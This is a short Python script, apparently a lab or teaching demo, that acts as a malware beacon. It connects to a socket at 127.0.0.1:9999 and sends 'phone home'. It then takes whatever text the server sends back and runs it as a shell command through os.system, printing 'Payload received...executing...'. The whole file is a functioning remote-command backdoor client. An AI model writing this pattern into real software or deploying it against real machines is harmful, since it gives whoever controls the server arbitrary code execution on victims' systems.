import socket
import os

HOST, PORT = "127.0.0.1", 9999
callback = "phone home"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
	sock.connect((HOST, PORT))
	sock.sendall(bytes(callback, "utf-8"))
	malicious_code = str(sock.recv(1024), "utf-8")
	if malicious_code:
		print("Payload received...executing...")
		os.system("{}".format(malicious_code))
